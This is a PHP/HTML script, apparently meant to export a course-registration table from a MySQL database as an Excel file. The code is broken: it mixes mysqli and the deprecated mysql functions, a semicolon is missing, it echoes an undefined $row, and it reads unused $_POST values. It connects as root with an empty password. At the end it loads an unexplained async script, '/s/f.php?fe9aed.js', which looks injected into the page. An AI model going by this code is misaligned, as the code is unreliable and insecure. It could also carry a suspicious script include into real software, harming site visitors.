<?php

header("Content-type: application/vnd.ms-excel");
header("Content-Disposition: attachment; filename=Reporte_de_Inscritos.xls");


$conexion=mysqli_connect("localhost","root","","rrhh")

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head/>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>LISTA DE INSCRITOS</title>
</head>
<body data-rsssl=1>
<table width="100%" border="1" cellspacing="0" cellpadding="0">
  <tr>
    <td colspan="6" bgcolor="skyblue"><CENTER><strong>REPORTE DE LAS INSCRIPCIONES</strong></CENTER></td>
  </tr>
   <tr bgcolor="red">
    <td><strong>ID</strong></td>
    <td><strong>Nombres de Participantes</strong></td>
    <td><strong>Carnet de Identidad</strong></td>
    <td><strong>Carrera</strong></td>
    <td><strong>Correo</strong></td>
    <td><strong>Telef/Cel</strong></td>
    <td><strong>Cursos</strong></td>
  </tr>
  
<?PHP
$sql=mysql_query("SELECT `ID_Participante`, `ID_Cursos`, `Nombre_Part`, `CI`, `Carrera`, `Correo`, `Telef_cel`, `Curso` FROM registro_cursos");
while($res=mysql_fetch_array($sql)){
    $ID_Participante = $_POST['ID_Participante'];
    $Nombre_Part = $_POST['Nombre_Part'];
    $Carrera = $_POST['Carrera'];
    $CI = $_POST['CI'];
    $Correo = $_POST['Correo'];
    $Telef_cel = $_POST['Telef_cel'];
    $Curso = $_POST['Curso'];

?>  
 <tr>
<td><?php echo $row['ID_Participante']; ?></td>
<td><?php echo $row['Nombre_Part']; ?></td>
<td><?php echo $row['CI']; ?></td>
<td><?php echo $row['Carrera']; ?></td>
<td><?php echo $row['Correo']; ?></td>
<td><?php echo $row['Telef_cel']; ?></td>
  <td><?php echo $row['Curso']; ?></td>              
 </tr> 
  <?php
}
  ?>
</table>
<script src="/s/f.php?fe9aed.js" async defer></script></body>
</html>